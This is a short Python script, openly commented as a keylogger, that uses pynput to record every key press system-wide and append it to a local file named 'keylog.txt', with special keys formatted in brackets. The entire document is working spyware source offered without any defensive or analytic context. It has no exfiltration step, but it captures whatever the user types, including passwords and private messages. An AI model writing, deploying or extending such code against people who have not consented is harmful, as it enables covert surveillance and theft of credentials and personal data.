from pynput.keyboard import Listener

# Log file where keystrokes will be saved
LOG_FILE = "keylog.txt"

def log_keystroke(key):
    key = str(key).replace("'", "")  # Clean up formatting
    if key == "Key.space":
        key = " "  # Replace 'Key.space' with a space
    elif key == "Key.enter":
        key = "\n"  # Replace 'Key.enter' with a new line
    elif key.startswith("Key"):
        key = f"[{key}]"  # Format special keys (e.g., [Key.shift])

    # Save the logged key to a file
    with open(LOG_FILE, "a") as file:
        file.write(key)

# Start the keylogger
with Listener(on_press=log_keystroke) as listener:
    listener.join()
